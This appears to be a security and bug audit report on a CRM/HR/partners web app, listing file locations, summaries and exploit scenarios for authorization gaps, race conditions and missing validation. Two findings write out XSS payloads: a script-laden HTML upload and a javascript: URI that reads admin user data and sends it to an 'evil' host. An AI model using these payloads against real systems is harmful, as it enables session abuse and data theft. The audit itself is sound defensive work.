SUM: PATCH/DELETE on saved-view skip the per-module gate — a user who lost a module (e.g. demoted from HR-admin to CRM-only) can still mutate or delete their leftover HR/Partners saved views.
SCEN: GET/POST on /api/saved-views/route.ts:65-67 and 96-99 now call `moduleForScope(scope)` and 403 if the session lacks that module — fixing the cross-module leak. PATCH/DELETE in [id]/route.ts do NOT call `moduleForScope`. A user previously had HR access, saved several HR views, then admin removes their HR module. They can still PATCH (e.g. update the filter to a different employee's payroll filter) 
---
FILE: super-app/src/app/api/saved-views/route.ts:7-15 + [id]/route.ts:7-14
SUM: `filters`, `sort`, `columns` typed as `z.unknown()` with no size cap — a user can persist multi-MB JSON blobs into the DB.
SCEN: POST /api/saved-views with `{ scope: 'crm:opportunities', name: 'x', filters: <giant object> }`. Zod's `z.unknown()` accepts ANY value. There's no `.refine()` size check and no parent body-size limit configured (no `next.config` body limit override found, default 1MB applies to the request body but the JSON blob can hit that ceiling and is then persisted in full). PATCH has the same problem on fil
---
FILE: super-app/src/app/(dashboard)/crm/sales-board/client.tsx:48-59 + lib/crm/stage-labels.ts:48-60
SUM: Sales-board hardcodes SPEC_STAGES — admin-curated CrmStageConfig custom labels/order/disabled stages are ignored.
SCEN: Admin goes to `/crm/admin/stage-config`, retires `POSTPONED` (sets `isActive=false`), adds a custom stage `FIELD_TRIAL`, renames `NEGOTIATION` to `Final Negotiation` in English. The sales-board page (client.tsx:153-167) renders 8 stage tiles by iterating the hardcoded `SPEC_STAGES` array (`['NEW','CONTACTED',...,'POSTPONED']`). The API at sales-board/route.ts:60-64 returns `stageCounts` keyed by t
---
FILE: super-app/src/app/(dashboard)/crm/admin/sales-report/client.tsx:91-128
SUM: Sales-report preview shows wrong KPIs — 'opened' = won+lost (not created in window) and 'wonValue' is hardcoded to 0.
SCEN: Manager opens /crm/admin/sales-report. `loadPreview` (line 91-128) fetches loss-analytics + pipeline + daily-reports. Line 118 sets `opened: lostCount + wonCount` — but the report ITSELF (export/route.ts:462) computes `opened = opps with createdAt in window`. The two numbers diverge: an opp created today but still in DISCOVERY counts in the Excel but NOT in the preview. Line 123 hardcodes `wonValu
---
FILE: super-app/src/app/api/crm/reports/sales-report/export/route.ts:101-112 + pdf/route.ts:99-110 + cohort-matrix/route.ts:27-41 + loss-analytics/route.ts:40-54 + win-rate-cube/route.ts:40-49
SUM: No `from <= to` validation across any report endpoint — passing `from=2026-12-31&to=2026-01-01` silently returns empty results.
SCEN: User opens the sales-report page and uses the date pickers to set `from=2026-06-09&to=2026-06-01` (typo / month-day swap). Both date strings pass the `^\d{4}-\d{2}-\d{2}$` regex. The endpoint constructs `to = 2026-06-01T23:59:59Z`, `from = 2026-06-09T00:00:00Z`. Every `where: { gte: from, lte: to }` query returns 0 rows. The report renders 'No opportunities in this window', and the manager assumes
---
FILE: super-app/src/app/(dashboard)/crm/admin/workflows/client.tsx:129-145 vs super-app/src/lib/crm/workflows/engine.ts:208-218
SUM: Set-field UI exposes `stage` as a target field but engine whitelist excludes it; admin workflows that target stage are saved successfully and then fail forever at run time.
SCEN: Admin (isAdminOnly=true) opens /crm/admin/workflows, clicks New workflow, picks event 'Opportunity created', action 'Set a field on the opportunity', and selects field='Stage' value='QUALIFIED'. Save returns 200 (route schema accepts any actionJson shape). On the first matching event, runAction takes the set-field branch, sees field='stage' not in allowed set {priority, nextAction, nextActionText,
---
FILE: super-app/src/app/api/crm/admin/alert-rules/route.ts:1-89 (and absence elsewhere)
SUM: Alert-rules feature has CRUD only — there is no evaluator anywhere in the codebase that reads CrmAlertRule.predicateJson, so configured rules never fire on any channel.
SCEN: Admin creates an alert rule on /crm/admin/alert-rules: scope='opportunity', predicate [{field:'stage', op:'in', value:['LOST']}], channels=['in-app','email']. The rule persists and shows Active in the table. Search confirms `CrmAlertRule` is referenced only by the route, the admin page/client, the sidebar, and the schema — there is no cron, no nightly job, no write-path hook that calls findMany on
---
FILE: super-app/src/app/(dashboard)/crm/admin/alert-rules/client.tsx:174 vs super-app/src/lib/crm/workflows/engine.ts:115-153
SUM: Alert rules store predicateJson as a flat array of clauses but the shared evalPredicate only understands {all|any|field-op-value} — even when an evaluator is added, the stored shape will never match.
SCEN: Save POST body is `predicateJson: clauses` (raw Clause[]). Server stores it as a JSON array. If anyone later wires evalPredicate(rule.predicateJson, payload), the function first checks typeof !== 'object' (arrays pass), then looks for 'all', 'any', 'field' keys — none present on an array — and falls through to `return false`. Every rule will silently never match.
---
FILE: super-app/src/app/api/hr/payroll/salaries/[id]/recalculate/route.ts:21-46
SUM: Per-row recalc only blocks 'finalized' — happily recalculates 'locked' and 'paid' salary rows.
SCEN: After Lock Month succeeds, hrMonthlySalary.status='locked' for every row (lock route line 70). An accountant calls POST /payroll/salaries/<id>/recalculate/ — the guard at line 22 only refuses status==='finalized', so the locked row's baseSalary/netSalary are overwritten in place, defeating the lock. Even worse, after mark-paid the row is status='paid' and this still runs.
---
FILE: super-app/src/app/api/hr/bonuses/[id]/route.ts:89-150
SUM: Bonus PATCH and DELETE have no status check and no payroll-lock check; they also write no audit log.
SCEN: Bonus is created and approved (status='applied'), included in company X's June 2026 payroll which is then locked and paid. An hr_manager PATCHes that bonus's bonus_amount/bonus_date/employee, or DELETEs it entirely. Route only checks isHROrAdmin then runs prisma.hrBonus.update / delete with no status, payroll-period, or audit guard. Same gap on incidents (super-app/src/app/api/hr/incidents/[id]/ro
---
FILE: super-app/src/app/api/hr/bonuses/route.ts:121-211
SUM: Bonus create endpoint has no payroll-period lock check (incidents do), so bonuses can be backdated into a locked/finalized/paid period.
SCEN: hr_manager POSTs /api/hr/bonuses/ with bonus_date='2026-06-15' for an employee whose company-X June 2026 payroll is already LOCKED or FINALIZED. The route creates the bonus in status='pending'; approve flips to 'applied'. Note that incident create (incidents/route.ts:192-205) does block this — bonuses don't.
---
FILE: super-app/src/app/api/hr/incidents/route.ts:236-240
SUM: Incident create accepts caller-supplied deduction_pct / action_taken without bounds, overriding the escalation table.
SCEN: createIncidentSchema (validations/incident.ts:7-9) declares deduction_pct as z.union([number,string]).optional() with NO min/max. An hr_manager POSTs incident with deduction_pct=999 (or -50). Route line 240 computes deductionAmount = (deductionPct/100) * baseSalary — so a 10,000 EGP salary becomes a 99,900 EGP deduction (or a NEGATIVE deduction that actually credits the employee). The configurable
---
FILE: super-app/src/app/api/hr/incidents/route.ts:218-232
SUM: Offense-number reset window uses 30-day months ('resetPeriodMonths * 30'), so an employee's offense count resets early and under-applies escalating penalties.
SCEN: A violation category has resetPeriodMonths=6 (i.e. 6 calendar months). The route computes windowStart = incidentDate - 6*30 = 180 days. An offense committed 5 months and 27 days ago (~178 days) is therefore correctly counted, but the policy intent is 6 calendar months which is up to 184 days. Worse, for a 12-month reset (12*30=360 days), incidents 360-365 days old fall outside the window. Employee
---
FILE: super-app/src/app/api/hr/bonuses/route.ts:65-72
SUM: Cross-company data leak: accountant and CEO see every company's bonuses; incidents GET has the identical bug.
SCEN: An accountant assigned only to authUser.companies=['companyA'] hits GET /api/hr/bonuses/. Line 66 marks accountant/ceo as 'isPrivileged' and skips employee scoping AND skips any companyId filter. The list returns bonuses for employees in companyB and companyC. Same flaw at incidents/route.ts:83-88. Note this contradicts canViewAllEmployees in permissions.ts which intentionally lists ceo/accountant
---
FILE: super-app/src/app/api/hr/overtime/requests/[id]/approve/route.ts:11-57
SUM: Overtime approve has the same race-then-update pattern that was fixed for bonus/incident, AND uses isHROrAdmin instead of the 'overtime:approve' permission that allows team_lead.
SCEN: Two HR managers click Approve on the same OT request at the same time. Both pass the status==='pending' check at line 29, both run prisma.update at line 49 — the second write succeeds, calculatedAmount is re-derived, approvedById gets the second admin's id. Separately, permissions.ts:105 says team_lead has 'overtime:approve', but this route refuses non-HR/admin (line 12), so team_leads can never a
---
FILE: super-app/src/app/api/hr/employees/route.ts:99-238
SUM: Employee create silently swallows the duplicate-email branch — and never returns the generated temp password, so the user can never sign in.
SCEN: HR submits an employee with work_email='john@x.com' where a User with that email already exists (e.g. they used to be employed). Line 182 finds existingUser, the whole 'if (!existingUser)' block is skipped: NO HrUserProfile is created, NO employee.userId linkage, NO role assignment, NO error returned. Caller gets a 201 with a serialized employee that has no user link. Even in the happy path (new u
---
FILE: super-app/src/app/api/hr/attendance/leave-requests/route.ts:104-119 + super-app/src/lib/hr/validations/leaveRequest.ts:8
SUM: Leave request creation trusts client-supplied days_count, has no overlap detection, no balance check, and no start<=end validation — employees can submit leaves that drain balances or claim phantom days.
SCEN: Employee POSTs { leave_type, start_date: '2026-07-20', end_date: '2026-07-19', days_count: 1 } to /api/hr/attendance/leave-requests/. days_count is z.number().optional() with no relation to the date range, so daysCount=1 is stored despite end<start producing a meaningless interval. The route also has no overlap check against existing pending/approved leaves and no annual-balance subtraction or che
---
FILE: super-app/src/app/api/hr/incidents/route.ts:219-221
SUM: Offense reset-period window uses resetMonths * 30 days instead of actual calendar months, so a 12-month reset window only looks back 360 days and 5+ stale offenses can re-enter the count.
SCEN: Violation rule has category.resetPeriodMonths = 12. Employee committed offense 1 on 2025-06-12. New incident filed 2026-06-08. Route does windowStart = incidentDate - 12*30 = 360 days back = 2026-06-13. The 2025-06-12 offense is OUTSIDE the window (one day before), so existingCount counts it as 0 and the new offense is numbered #1 instead of #2 — meaning a 5-time repeat offender escapes terminatio
---
FILE: super-app/src/app/api/hr/calendar/leaves/route.ts:62-64
SUM: When a non-cross-company user has zero allowed companies (hrCompanies=[]), the employee-company filter is skipped — they see every company's leaves on the calendar.
SCEN: A new HR-module user is provisioned with session.user.modules including 'hr' but hrCompanies is [] (e.g. a freshly seeded accountant or new employee). They are not super_admin or ceo. companyId query param omitted. Code: 'else if (!isCrossCompany && allowed.length > 0)' — but allowed.length === 0 so the else-if is false, and no companyId filter is added. db.hrLeaveRequest.findMany then returns all
---
FILE: super-app/src/app/(dashboard)/hr/incidents/submit/page.tsx:168 + src/lib/hr/api.ts:10,207
SUM: Submit Incident page posts to /incidents/incidents/ (and incidentsApi.list/get/update do the same), but the actual route is /api/hr/incidents/ — every Submit Incident click returns 404.
SCEN: HR Manager opens /hr/incidents/submit, fills the 4-step wizard, clicks 'Submit Incident'. submitMutation calls api.post('/incidents/incidents/', formData). api.ts baseURL is '/api/hr', so the actual request is POST /api/hr/incidents/incidents/. That folder does not exist (super-app/src/app/api/hr/incidents/ has route.ts, [id], violation-categories, violation-rules — no 'incidents' subfolder). Resu
---
FILE: super-app/src/lib/hr/permissions.ts:104-105 + overtime/requests/[id]/approve/route.ts:12
SUM: Permissions table grants leave:approve and overtime:approve to team_lead, but every approve/deny/list/bulk endpoint actually gates on isHROrAdmin (super_admin + hr_manager only) — team leads are documented to approve but functionally blocked.
SCEN: User is provisioned with role 'team_lead' and several direct reports. They navigate to /hr/overtime/pending and try to approve a direct report's request. POST /api/hr/overtime/requests/[id]/approve/ check at line 12 is 'if (!isHROrAdmin(authUser))' which only allows super_admin+hr_manager — returns 403 'Permission denied.'. Same for /deny, bulk-approve, leave approve/deny, and the leave-requests l
---
FILE: super-app/src/app/api/hr/attendance/checkout/route.ts:17-49
SUM: Check-out keys the lookup on 'today at 00:00 local' and computes hoursWorked from (outMinutes - inMinutes) of the same calendar day — night-shift workers checking out past midnight either can't find the check-in row at all or get 0 hours via Math.max(0, negative).
SCEN: Employee A is on a 22:00-06:00 shift. They check in at 22:30 on 2026-06-08 — checkin route creates a row with date=2026-06-08 00:00 and checkIn='22:30:00'. At 06:15 the next morning they tap Clock Out. The checkout route computes today = new Date() with hours zeroed = 2026-06-09 00:00, then findUnique by employeeId_date with date=2026-06-09 — no row exists, response is 400 'No check-in record foun
---
FILE: super-app/src/app/api/partners/registrations/route.ts:67-105
SUM: Cross-partner data leak via conflictWith: the conflictingClient query searches PartnerClient globally with no partnerId filter and stores the foreign client's id on the requesting partner's registration
SCEN: Partner A registers prospectDomain 'acme.com'. Code computes split('.')[0] = 'acme' and runs db.partnerClient.findFirst({where:{company:{contains:'acme', mode:'insensitive'}}}) — no partnerId filter. If Partner B has a client with company 'Acme Corp', the lookup returns Partner B's client.id. Partner A's registration row is then created with conflictWith: <Partner B's client id> (and conflictingCl
---
FILE: super-app/src/app/api/partners/tiers/route.ts:16-23
SUM: Tier list GET uses requireAuthSession instead of requirePartnerAuth — any authenticated user (HR, CRM-only) can read tier definitions and commission rates
SCEN: An HR-only user with no `partners` module entry on their session (session.user.modules = ['hr']) hits GET /api/partners/tiers. requireAuthSession only checks session?.user?.id, so the call returns 200 with the full tier table including minRevenue90d and commissionRate. Every other partners route in this module uses requirePartnerAuth (which also validates modules.includes('partners')); this is the
---
FILE: super-app/src/app/(dashboard)/partners/deals/[id]/page.tsx:23-44
SUM: Partner deal-detail page calls wrong URL paths — every action (view, Mark Won, Mark Lost, Delete) returns 404 because of a `/partners/...` prefix on top of the api helper's own `/api/partners` prefix
SCEN: The api helper (super-app/src/lib/partners/api.ts:43) prepends `/api/partners` to whatever path is passed. The list page correctly passes `/deals` → `/api/partners/deals`. The detail page passes `/partners/deals/${id}` (line 23), which resolves to `/api/partners/partners/deals/${id}`. That route does not exist (only `/api/partners/partners/[id]` and `/api/partners/partners/me` exist), so every fet
---
FILE: super-app/src/app/api/partners/contracts/route.ts:38-78 + super-app/src/app/api/partners/invoices/route.ts:38-79
SUM: No uniqueness on contract/invoice per deal — partner can spam-create unbounded contract and invoice requests against a single WON deal
SCEN: PartnerContract and PartnerInvoice schemas (prisma/schema.prisma:3967-4008) have plain `dealId String` with no @unique and no compound uniqueness. POST /api/partners/contracts with the same {dealId:<own WON deal>} can be called in a loop; each call creates a fresh REQUESTED row. There is no existence check in the route. PartnerCommission correctly has dealId @unique, but contracts/invoices do not.
---
FILE: super-app/src/app/api/partners/deals/[id]/route.ts:70-77 + super-app/src/app/api/partners/tiers/route.ts:1-49
SUM: Tier program is decorative — WON commission rate is read from PartnerProfile.commissionRate, never from the partner's PartnerTier; no tier-recompute cron exists
SCEN: PartnerTier is created/listed by the tiers route but nothing in the codebase ever reads tier.commissionRate at WON time. The PATCH handler reads partnerProfile.commissionRate (line 72) which is set at partner creation (super-app/src/app/api/partners/partners/route.ts:63 default 10) and only mutated by /api/partners/partners/[id] PATCH (manual admin edit). A grep across src for /tier-recompute|reco
---
FILE: super-app/src/app/api/admin/impersonate/stop/route.ts:67-92
SUM: Audit log misclassifies normal `Return to admin` banner clicks as `force-stopped`
SCEN: Admin clicks `Return to admin` on the banner. The session at this moment carries actingAs = admin.id, session.user.id = target.id (because the JWT swap is active). The route resolves finalRow via adminCandidates = [actingAs] = [admin.id] and finds the matching row. The audit row at line 78-92 sets `reason` based on `initiatorId === finalRow.adminUserId` -- but initiatorId is session.user.id (the T
---
FILE: super-app/src/lib/hr/audit.ts:25-64 and super-app/src/app/api/hr/**/route.ts (12 callers)
SUM: HR audit-log writers never populate actingAdminId, so impersonated HR actions are attributed solely to the target
SCEN: Admin impersonates HR user X and performs any HR mutation -- e.g. POST /api/hr/employees, PATCH /api/hr/employees/[id], PATCH /api/hr/bonuses, PATCH /api/hr/payroll/monthly/lock, POST /api/hr/auth/users/[id]. Every call site I inspected (employees route line 230, employees/[id] line 113 and 145, settings line 123 and 166, bonuses line 196, auth/users/[id] line 125, employees/[id]/documents line 34
---
FILE: super-app/src/lib/partners/helpers.ts:130-148 and super-app/src/app/api/partners/{contracts,invoices,commissions}/[id]/{review,status}/route.ts
SUM: Partner audit-log writers never populate actingAdminId, so impersonated partner approvals lose admin attribution
SCEN: Platform admin impersonates a partner-admin user and approves a contract or commission (e.g. POST /api/partners/contracts/[id]/review with action=APPROVED). The route at contracts/[id]/review line 54-62, invoices/[id]/review line 53-61, and commissions/[id]/status line 54-62 call writePartnerAudit without passing actingAdminId. The PartnerAuditEntry interface declares actingAdminId (line 127), wri
---
FILE: super-app/src/lib/auth.ts:253-277 vs 474-486
SUM: signIn allows users whose JWT will give them zero modules, silently locking them out after login
SCEN: Admin creates a user with hrAccess=true but does NOT create an hrProfile (or the user has hrAccess=true and crmAccess=true but only crmProfile, no hrProfile). The signIn callback at line 270-276 evaluates `(dbUser.hrAccess && dbUser.hrProfile?.isActive !== false)` -- with hrProfile null, `hrProfile?.isActive` is undefined and `undefined !== false` is TRUE, so the user is allowed to sign in. Then t
---
FILE: super-app/src/app/api/admin/impersonate/route.ts:25-30 and stop/route.ts:23-28
SUM: isPlatformAdmin in impersonate routes treats any partners-module user without partnerId as full impersonation authority
SCEN: The check is `hrRoles.includes('super_admin') OR (modules.includes('partners') AND !partnerId)`. A user provisioned with partnersAccess=true but no PartnerProfile row is treated as a `partners admin` -- and the route comment claims super_admin only. Such a user can POST /api/admin/impersonate with any userId, including a super_admin target. The schema doesn't restrict target by role.
---
FILE: super-app/src/app/api/hr/dashboard/group-metrics/route.ts:5-110
SUM: Any HR-authed user (including base 'employee') can read org-wide salary budget, attendance, incident counts
SCEN: A user with only the `employee` HR role does `GET /api/hr/dashboard/group-metrics`. `requireAuth` only verifies authentication — no `canViewAllEmployees` / `isManagement` / role gate. The response includes `total_monthly_payroll` (sum of every netSalary in the system), per-company payroll budgets, pending issues and attendance rates. Same applies to /api/hr/dashboard/metrics/route.ts, /api/hr/dash
---
FILE: super-app/src/app/api/crm/customer-needs/route.ts:12-22
SUM: Authenticated user without crm module reads CRM customer-need catalog via missing proxy/module check
SCEN: Although the global proxy (src/proxy.ts:363-365) blocks `/api/crm` for !modules.includes('crm') in production, this route handler has no in-route defense. If the proxy is bypassed (matcher edge cases, internal SSR fetch, server-action call from a non-CRM context) or in a deploy where the matcher excludes it, the route returns CRM customer-need labels to any authenticated user. Same lack of in-rout
---
FILE: super-app/src/app/api/crm/sales-board/route.ts:16-205
SUM: CRM sales board grants HR super_admin full visibility but has no in-route crm-module gate, and the rep groupBy has no scope
SCEN: Route checks only `session?.user?.id`. Inside, `isManager = crmRole==='MANAGER'||'ADMIN'||hrRoles.includes('super_admin')`. So an HR super_admin (no crm module) is treated as a CRM manager and gets per-rep KPIs, conversion rates, monthly $ aggregates. The groupBy at line 107-110 (`db.crmOpportunity.groupBy({ by: ['ownerId','stage'] })`) runs with NO where filter, so the response includes every rep
---
FILE: super-app/src/app/api/crm/opportunities/[id]/contact/route.ts:60-73
SUM: Contact PATCH overwrites every contact field to null when caller sends only one field
SCEN: A rep PATCHes /api/crm/opportunities/<id>/contact with body { customerContactName: 'New Name' } — the schema marks all three fields as nullable+optional. The update writes `customerContactName: parsed.data.customerContactName ?? null, customerContactPhone: parsed.data.customerContactPhone ?? null, customerContactEmail: parsed.data.customerContactEmail ?? null` unconditionally. Since `phone` and `e
---
FILE: super-app/src/app/api/hr/employees/route.ts:56-58
SUM: Team leads see every employee in their entire company instead of only their direct reports
SCEN: A team_lead GETs /api/hr/employees. `canViewAllEmployees` returns false for team_lead (not in the allowed list at lib/hr/permissions.ts:39-41), so the fallback at line 57 runs: `where.companyId = { in: authUser.companies }`. That returns ALL employees in the team_lead's company — bypassing the team-only contract a `team_lead` is supposed to have (visible in /hr/team page rules and `subordinates.ts
---
FILE: super-app/src/app/api/admin/impersonate/route.ts:25-44
SUM: A partners-platform-admin (modules.includes('partners') && !partnerId) can impersonate any HR or CRM user, including super_admins
SCEN: A user has only the partners module without a partnerId — making them the 'Partners platform admin'. They POST /api/admin/impersonate { userId: '<any_super_admin_user_id>' }. `isPlatformAdmin` returns true via the OR branch. The route creates a CrmImpersonationSession; on the next request, the JWT callback hands them the target's full session including hr super_admin roles, granting them payroll/f
---
FILE: super-app/src/app/api/partners/registrations/route.ts:55-107
SUM: Deal-registration uniqueness check is racy — two partners can both register the same prospect domain.
SCEN: Partner A and Partner B both POST `/api/partners/registrations` for `acme.com` within the same 100 ms (or after a near-simultaneous prospect call). Both queries at line 55 find no `conflictingRegistration` (status APPROVED + within 90 days). Both queries at line 75 find no `ownPriorRegistration` (different partnerId). Both then `db.partnerDealRegistration.create` with status=PENDING. The `partnerI
---
FILE: super-app/src/lib/crm/business/auto-code.ts:3-29
SUM: Code generators wrap a read-only SELECT in a transaction that does nothing — concurrent opportunity/call creation generate duplicate codes.
SCEN: Two reps click 'Create opportunity' in the same second. Both invocations of `generateOpportunityCode` open a Prisma `$transaction` block, both run `tx.crmOpportunity.findFirst({ orderBy: { code: 'desc' } })`. Postgres default READ COMMITTED isolation lets both see the same `last.code = 'OPP-0042'`. Both return `'OPP-0043'`. Each caller then exits the (read-only) transaction and the calling code us
---
FILE: super-app/src/app/api/crm/pipeline/route.ts:156-233
SUM: Drag-drop stage change has no atomic guard — two simultaneous drags corrupt the stage-history trail.
SCEN: Rep drags an opportunity from CONTACTED → DISCOVERY in their tab while a manager drags the same opp from CONTACTED → QUALIFIED in another window. Both load `opp` with stage=CONTACTED at line 156, both pass `opp.stage === parsed.data.newStage` skip-check, both compute `probabilityPct` and finance. Both enter `db.$transaction([update, stageHistory.create])`. Postgres serializes commit order. Final o
---
FILE: super-app/src/app/(dashboard)/crm/opportunities/actions.ts:639-789
SUM: changeStage server action races on stage gate — concurrent reps can fire duplicate workflows + double-count duration.
SCEN: Manager and rep both run changeStage on the same opp simultaneously. Both pass the source-stage `requiredFields` gate at line 672 reading from the SAME pre-tx `opp` snapshot, both compute `durationDays` against the same lastStageChange. Both enter `db.$transaction` at line 759. No `updateMany({ where: { id, stage: opp.stage }})` gate exists, so both writes go through. CrmStageHistory gets two rows
---
FILE: super-app/src/app/api/crm/cold-leads/distribute/route.ts:62-77
SUM: Distribute uses Promise.all of bare updates with no transaction — partial failure leaves leads half-assigned with no error contract.
SCEN: Manager selects 100 leads and 5 reps for round-robin distribution. Mid-flight, one of the lead ids no longer exists (someone else just archived it). `Promise.all([db.crmColdLead.update(...) x100])` triggers concurrent updates; the failing update throws but the OTHERS already committed (no surrounding $transaction). The endpoint propagates the throw to a 500 'Server error' to the manager, but 60 of
---
FILE: super-app/src/app/api/crm/cold-leads/[id]/disposition/route.ts:45-86
SUM: Disposition ownership check is TOCTOU — old rep can write disposition after a manager reassigned the lead.
SCEN: Rep A has lead L assigned. Manager reassigns L to Rep B via `super-app/src/app/api/crm/admin/reassign-territory/route.ts` at the same moment Rep A POSTs `/cold-leads/L/disposition` with NO_ANSWER. The disposition endpoint reads `lead.assignedToId` at line 47, sees it's still Rep A's id (or the reassign hasn't committed yet), passes the `canTouch` check at line 55, and then writes the disposition +
---
FILE: super-app/src/app/api/partners/commissions/[id]/status/route.ts:30-52
SUM: Commission status machine reads then updates without atomic gate — concurrent admin actions skip states.
SCEN: Admin opens a PENDING commission in two browser tabs (or two admins act simultaneously). Both PATCH `/partners/commissions/{id}/status` with status=APPROVED. Both reads at line 30 see status=PENDING. Both pass `VALID_TRANSITIONS.PENDING.includes('APPROVED')`. Both writes execute. Now imagine a manager raced PENDING→APPROVED with the partner's own re-issue at PAID — read 1 sees PENDING, validates o
---
FILE: super-app/src/app/api/tasks/[id]/attachments/route.ts:24-142
SUM: Task attachment upload has NO MIME allowlist — stored XSS via `text/html` or `image/svg+xml`
SCEN: Any user with access to a task (assignee, creator, watcher) POSTs `{ filename: "exploit.html", mimeType: "text/html", contentBase64: "<base64 of <script>fetch('/api/admin/users')…</script>>" }`. metaSchema (lines 70-76) caps name/size only, not mimeType. The file is written to `public/uploads/tasks/<taskId>/<hash>-exploit.html` and `created.url = /uploads/tasks/.../exploit.html`. Next.js serves fi
---
FILE: super-app/src/app/api/hr/employees/import/route.ts:1-138
SUM: HR employee bulk-import accepts unbounded xlsx upload with no size cap, no MIME check, no row cap
SCEN: An HR/admin POSTs a 2 GB .xlsx to /api/hr/employees/import. There's no `file.size` check (compare to cold-leads/import/route.ts:209-215 which caps at 25 MB). `workbook.xlsx.load(arrayBuf)` materialises the entire sheet in Node memory, then `for (let rowNum = 2; rowNum <= worksheet.rowCount; rowNum++)` issues five+ sequential DB queries per row with no upper bound. A 100k-row sheet from an attacker
---
FILE: super-app/src/lib/hr/validations/bonus.ts:1-46
SUM: HR bonus / incident / overtime / payroll schemas have ZERO `.max()` on any string — multi-MB inputs accepted
SCEN: A privileged HR user (or any caller with access to the relevant endpoint) POSTs `comments: <2MB string>` to /api/hr/bonuses, or `evidence: <huge base64 blob>` to /api/hr/incidents. createBonusSchema/createIncidentSchema/createOvertimeRequestSchema/createLeaveRequestSchema all use bare `z.string().optional()` for free-text fields (comments, evidence, reason, dismissed_reason, manual_reason, action_
---
FILE: super-app/src/lib/hr/validations/employee.ts:1-37
SUM: createEmployeeSchema has no `.max()` on national_id, email, address, phone, IBAN, bank_account, names; also `currency` is unvalidated free-text
SCEN: An HR user POSTs /api/hr/employees with `address: <500KB string>` or `iban: <arbitrary garbage>`. Every string field is `z.string().optional()` with no length cap. `currency: z.string().default('EGP')` accepts anything, breaking the downstream FX calculation paths that switch on currency code. national_id (used as a unique key) accepts arbitrary length/charset, so a single rogue HR can poison the 
---
FILE: super-app/src/lib/crm/validations/company.ts:3-19 and contact.ts:3-20
SUM: CRM createCompany / createContact / createCall / createProduct schemas have NO `.max()` on any string — nameEn, notes, address, phone, fullName all unbounded
SCEN: Any CRM rep posts to /api/crm/companies with `nameEn: <2MB string>` or `notes: <unbounded>`. `z.string().min(1, …)` validates the floor but never the ceiling. The Prisma model accepts the value, and every subsequent CRM list view that includes notes / nameEn drags the blob across the wire. Same in createContactSchema (fullName, role, phone, whatsapp, linkedIn, notes), createCallSchema (nextActionT
---
FILE: super-app/src/lib/partners/validations.ts:34-102
SUM: Partner `value`, `basePrice`, `amount` numbers have no `.max()` — Decimal overflow / commission inflation
SCEN: A partner POSTs /api/partners/deals with `value: 1e308`. createDealSchema only enforces `z.number().min(0)` (validations.ts:94). The deal saves; when the deal is later flipped to WON, /api/partners/deals/[id]/route.ts:77 computes `commissionAmount = dealValue * (rate / 100)` and writes it into `partnerCommission.amount` (Decimal). The number exceeds Decimal precision, producing either a Prisma err
---
FILE: super-app/src/lib/crm/validations/company.ts:8
SUM: company.website / hr/jobs apply resumeUrl / hr/expenses receiptUrl / partner branding logoUrl accept `javascript:` / `data:` URIs
SCEN: A CRM rep posts to /api/crm/companies with `website: "javascript:fetch('/api/admin/users').then(r=>r.text()).then(t=>navigator.sendBeacon('//evil/',t))"`. `z.string().url()` accepts `javascript:` URLs as valid URLs (per WHATWG). The company detail page renders `<a href={company.website} target="_blank">`. Anyone (manager, admin) who clicks the link runs the script in the app origin. Identical issu
---
FILE: super-app/src/app/(dashboard)/crm/admin/workflows/client.tsx:305-318
SUM: Silent failure on Disable/Activate workflow — no toast and no UI change when API returns non-OK
SCEN: CRM admin clicks the trash/disable button on a workflow row, or flips the Active switch. The API returns 403 (insufficient perms), 409 (in-flight runs), or 500. The handler only does `if (res.ok) load()` — there is no `else` branch, no toast, no try/catch. The user sees no feedback at all; the workflow keeps firing.
---
FILE: super-app/src/app/(dashboard)/crm/admin/pipelines/client.tsx:104-111
SUM: toggleActive() silently fails — same `if (res.ok) load()` pattern with no error path
SCEN: Admin toggles a pipeline's active state. API returns 500 (orphan opportunities) or 403. No toast. The UI stays on its previous value because `load()` only runs on success — but the user just saw the visual flip didn't happen, so they click again, possibly causing two flips on the server when transient errors clear.
---
FILE: super-app/src/app/(dashboard)/admin/workflows-sequential/client.tsx:40-52
SUM: Run button has no in-flight disable AND res.json() throws unguarded on non-JSON 500
SCEN: Admin clicks the Run button on a Sequential Workflow card. trigger() has no `disabled` state on the button (line 107-110) — admin can click again before the first POST returns, creating duplicate workflow runs (each spawns its own first-task). Also `await res.json()` (line 46) has no `.catch(() => ({}))`, so if the server crashes returning HTML (500 dev page), the function throws an unhandled reje
---
FILE: super-app/src/app/(dashboard)/admin/board/client.tsx:78-84
SUM: Admin board renders 'Loading...' forever when /api/admin/board fails (no .catch on fetch chain)
SCEN: Admin opens /admin/board. `fetch().then().then().finally()` chain — no `.catch()`. On network failure or 500, the `.then(r => r.ok ? r.json() : null)` returns null, `setData(d)` sets data to null, and the gate `loading || !data` (line 101) stays true forever. The user sees a spinner with 'Loading...' indefinitely with no error tile, no retry.
---
FILE: super-app/src/app/(dashboard)/crm/pipeline/client.tsx:162-179, 128-153
SUM: Pipeline refresh() and filter loaders have no .catch — silent blank kanban on transient network errors
SCEN: Sales rep loads /crm/pipeline. The initial fetch of `/api/crm/filters` and `/api/crm/stages` (lines 129, 136) has no `.catch()` — on failure the filter dropdowns stay empty silently. `refresh()` (line 162) uses `try { ... } finally { setLoading(false) }` with NO `catch` — on a network failure (fetch throws), the rep sees the loading spinner replaced by an empty board with no error tile and no toas
---
FILE: super-app/src/app/(dashboard)/crm/meetings/client.tsx:140-193
SUM: approveMeeting/denyMeeting/patchStatus/remove all crash silently on network failure (no try/catch)
SCEN: Assistant clicks Approve / Deny / Mark-Done / Delete on a meeting row. The functions await `fetch(...)` outside any try/catch. On network drop (offline, captive portal, proxy redirect to HTML) fetch rejects — the entire promise chain dies, no toast renders, the row stays in PENDING_APPROVAL forever. The same pattern in crm/cold-leads/client.tsx for delete/disposition mutations (line 324-393).
---
FILE: super-app/src/app/(dashboard)/hr/overtime/pending/page.tsx:118-138
SUM: bulkApproveMutation uses Promise.all — partial success leaves cache stale and lets admin double-approve
SCEN: Admin selects 5 overtime requests and clicks 'Approve Selected'. `Promise.all(selectedIds.map(id => api.post('.../approve/')))` fires 5 parallel POSTs. The 3rd request returns 403 (rep already approved by manager). Promise.all rejects, triggering onError → toast 'Failed to approve requests'. BUT requests #1 and #2 already returned 200 and were approved server-side. onError does NOT invalidate the 
---
FILE: super-app/src/components/layout/NotificationCenter.tsx:173-227
SUM: Entire global notification popover is hardcoded English; never reads from the dictionary.
